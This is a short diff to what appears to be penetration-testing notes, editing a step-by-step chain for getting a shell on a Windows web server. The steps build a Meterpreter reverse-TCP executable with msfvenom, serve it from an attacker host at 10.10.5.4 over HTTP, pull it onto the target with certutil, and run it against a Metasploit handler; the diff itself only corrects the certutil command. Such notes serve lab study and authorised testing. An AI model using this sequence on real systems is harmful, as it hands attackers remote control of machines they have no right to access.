@@ -110,8 +110,8 @@ nmap -p80 --script http-enum,http-headers,http-methods,http-webdav-scan --script
 	4. will get basic cmd shell access
 2. `msfvenom -p windows/meterpreter/reverse_tcp LHOST-10.10.5.4 LPORT=1234 -f exe > meterpreter.exe`
 3. `sudo python -m SimpleHTTPServer 80` : host the payload
-4. `certutil -urlcache -f http://10.10.5.4/meterpreter.exe` : use inbuilt tool to dl the payload
-5. set up msf handler with payload windows/meterpreter/reverse_tcp
+4. `certutil -urlcache -f http://10.10.5.4/meterpreter.exe meterpreter.exe` : use inbuilt tool to dl the payload
+5. set up MSF handler with payload windows/meterpreter/reverse_tcp
 6. `.\meterpreter.exe` : launch payload to connect to handler
 
 ### Useful Modules
